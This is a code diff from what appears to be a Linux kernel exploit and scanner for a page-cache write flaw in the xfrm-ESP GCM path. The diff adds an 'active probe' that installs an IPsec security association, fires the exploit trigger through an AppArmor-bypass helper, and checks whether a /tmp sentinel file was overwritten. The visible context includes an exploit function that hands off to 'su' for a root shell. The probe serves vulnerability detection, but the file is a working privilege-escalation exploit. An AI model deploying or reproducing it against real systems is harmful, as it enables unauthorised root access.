@@ -104,8 +104,16 @@ df_result_t copyfail_gcm_detect(void)
         return DF_PRECOND_FAIL;
     }
 
+    if (dirtyfail_active_probes) {
+        log_step("--active set: firing rfc4106(gcm) trigger against /tmp sentinel");
+        df_result_t pr = copyfail_gcm_active_probe();
+        if (pr == DF_VULNERABLE || pr == DF_OK || pr == DF_PRECOND_FAIL) return pr;
+        log_warn("active probe inconclusive — falling back to precondition verdict");
+    }
+
     log_warn("VULNERABLE — GCM-variant of xfrm-ESP page-cache write reachable");
     log_warn("apply mainline patch f4c50a4034e6 or distro backport");
+    log_hint("re-run with `--scan --active` for an empirical sentinel-STORE probe");
     return DF_VULNERABLE;
 }
 
@@ -533,4 +541,92 @@ df_result_t copyfail_gcm_exploit(bool do_shell)
     execlp("su", "su", user, (char *)NULL);
     log_bad("execlp: %s", strerror(errno));
     return DF_EXPLOIT_FAIL;
+}
+
+/* ---------------------------------------------------------------- *
+ * Active probe — `--scan --active`.
+ *
+ * Install GCM SA with an arbitrary IV and fire ONE trigger against a
+ * /tmp sentinel. We skip the IV brute force: keystream XOR ciphertext
+ * is unpredictable but ANY byte change at sentinel[0] proves the
+ * kernel ran the in-place STORE.
+ * ---------------------------------------------------------------- */
+
+df_result_t copyfail_gcm_active_probe_inner(void)
+{
+#ifdef __linux__
+    const char *sentinel = getenv("DIRTYFAIL_PROBE_SENTINEL");
+    if (!sentinel || !*sentinel) {
+        log_bad("gcm-probe: DIRTYFAIL_PROBE_SENTINEL not set");
+        return DF_TEST_ERROR;
+    }
+
+    /* Arbitrary fixed IV — keystream is then deterministic but we
+     * don't need to predict it. */
+    static const uint8_t probe_iv[IV_LEN] = {
+        0xDE, 0xAD, 0xBE, 0xEF, 0x01, 0x02,
+        0x03, 0x04, 0x05, 0x06, 0x07, 0x08
+    };
+
+    if (!gcm_install_sa(probe_iv)) {
+        log_bad("gcm-probe: ip xfrm state add failed");
+        return DF_TEST_ERROR;
+    }
+    if (!gcm_trigger(sentinel, 0, probe_iv)) {
+        log_bad("gcm-probe: trigger failed");
+        return DF_TEST_ERROR;
+    }
+    return DF_EXPLOIT_OK;
+#else
+    return DF_TEST_ERROR;
+#endif
+}
+
+df_result_t copyfail_gcm_active_probe(void)
+{
+    char tmpl[] = "/tmp/dirtyfail-gcm-probe.XXXXXX";
+    int sfd = mkstemp(tmpl);
+    if (sfd < 0) { log_bad("gcm-probe mkstemp: %s", strerror(errno)); return DF_TEST_ERROR; }
+    unsigned char filler[4096];
+    memset(filler, 'A', sizeof(filler));
+    if (write(sfd, filler, sizeof(filler)) != (ssize_t)sizeof(filler)) {
+        close(sfd); unlink(tmpl); return DF_TEST_ERROR;
+    }
+    close(sfd);
+
+    int rfd = open(tmpl, O_RDONLY);
+    if (rfd < 0) { unlink(tmpl); return DF_TEST_ERROR; }
+    char tmp[4096];
+    if (read(rfd, tmp, sizeof(tmp)) != (ssize_t)sizeof(tmp)) {
+        close(rfd); unlink(tmpl); return DF_TEST_ERROR;
+    }
+    close(rfd);
+
+    setenv("DIRTYFAIL_INNER_MODE",     "gcm-probe", 1);
+    setenv("DIRTYFAIL_PROBE_SENTINEL", tmpl,        1);
+    int rc = apparmor_bypass_fork_arm(0, NULL);
+    unsetenv("DIRTYFAIL_INNER_MODE");
+    unsetenv("DIRTYFAIL_PROBE_SENTINEL");
+
+    if (rc == DF_PRECOND_FAIL) { unlink(tmpl); return DF_PRECOND_FAIL; }
+    if (rc != DF_EXPLOIT_OK)   {
+        log_bad("gcm-probe inner failed (exit=%d)", rc);
+        unlink(tmpl); return DF_TEST_ERROR;
+    }
+
+    rfd = open(tmpl, O_RDONLY);
+    if (rfd < 0) { unlink(tmpl); return DF_TEST_ERROR; }
+    unsigned char after[16];
+    ssize_t got = read(rfd, after, sizeof(after));
+    close(rfd);
+    unlink(tmpl);
+    if (got <= 0) return DF_TEST_ERROR;
+
+    if (after[0] != 'A') {
+        log_warn("ACTIVE PROBE gcm: sentinel[0] changed 'A' → 0x%02x → kernel is VULNERABLE",
+                 after[0]);
+        return DF_VULNERABLE;
+    }
+    log_ok("ACTIVE PROBE gcm: sentinel[0] intact — kernel rfc4106 path appears patched");
+    return DF_OK;
 }
